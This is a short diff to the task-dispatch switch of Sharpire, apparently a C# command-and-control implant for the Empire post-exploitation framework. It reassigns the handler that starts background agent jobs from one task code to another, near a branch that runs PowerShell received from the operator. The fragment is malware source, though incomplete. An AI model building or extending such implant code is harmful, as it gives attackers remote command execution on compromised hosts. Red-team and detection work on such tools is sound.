@@ -270,19 +270,18 @@ namespace Sharpire
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return EncodePacket(packet.type, Agent.RunPowerShell(packet.data), packet.taskId);
                     case 101:
-                    case 102:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task101(packet);
+                    case 102:
+                        jobTracking.StartAgentJob(packet.data, packet.taskId);
+                        jobTracking.jobs[taskId.ToString()].Status = "running";
+                        return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
                     case 121:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task121(packet);
                     case 122:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task122(packet);
-                    case 123:
-                        jobTracking.StartAgentJob(packet.data, packet.taskId);
-                        jobTracking.jobs[taskId.ToString()].Status = "running";
-                        return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
                     default:
                         jobTracking.jobs[taskId.ToString()].Status = "error";
                         return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
